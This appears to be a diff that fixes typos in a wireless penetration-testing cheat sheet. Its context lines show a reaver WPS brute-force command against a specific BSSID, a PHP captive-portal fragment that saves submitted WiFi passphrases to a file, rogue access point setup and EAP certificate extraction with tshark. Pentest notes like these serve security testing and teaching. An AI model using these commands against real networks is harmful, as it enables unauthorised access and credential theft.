@@ -140,7 +140,7 @@ sudo airmon-ng stop wlan0
 ### Important Options
 
 | flag    | action              |
-|---------|---------------------|
+| ------- | ------------------- |
 | -w      | Write file location |
 | --bssid | Filter a BSSID      |
 | -c      | Filter a channel    |
@@ -315,7 +315,7 @@ wash -i wlan0mon
 
 ### Attempt to brute force
 
-- Rate Limit wll probably kick in
+- Rate Limit will probably kick in
 
 ```bash
 sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v
@@ -435,7 +435,7 @@ $success_path = '/tmp/passphrase.txt';
 $passphrase = $_POST['passphrase'];
 
 # Make sure passphrase exists and
-# is within passphrase lenght limits (8-63 chars)
+# is within passphrase length limits (8-63 chars)
 if (!isset($_POST['passphrase']) || strlen($passphrase) < 8 || strlen($passphrase) > 63) {
   header('Location: index.php?failure');
   die();
@@ -600,7 +600,7 @@ sudo a2enmod rewrite
 sudo a2enmod alias
 ```
 
-## Spacial Chrome support
+## Special Chrome support
 
 ```xml
 <VirtualHost *:443>
@@ -643,7 +643,7 @@ sudo systemctl restart apache2
 
 ## Rogue AP with Captive Portal
 
-### Createa hostapd config
+### Create a hostapd config
 
 ```bash
 interface=wlan0
@@ -723,7 +723,7 @@ sudo systemctl stop wpa_supplicant
 tshark -r <PCAP.pcap> -R 'wlan.bssid==<BSSID> && eap && tls.handshake.certificate' -2 -T fields -e  ssl.handshake.certificate | sed 's/://g' | xxd -ps -r | tee <CERT.DER> | openssl x509 -inform der -text
 ```
 
-### Conver to PEM
+### Convert to PEM
 
 ```bash
 openssl x509 -inform der -in cert.der -outform pem -out cert.crt
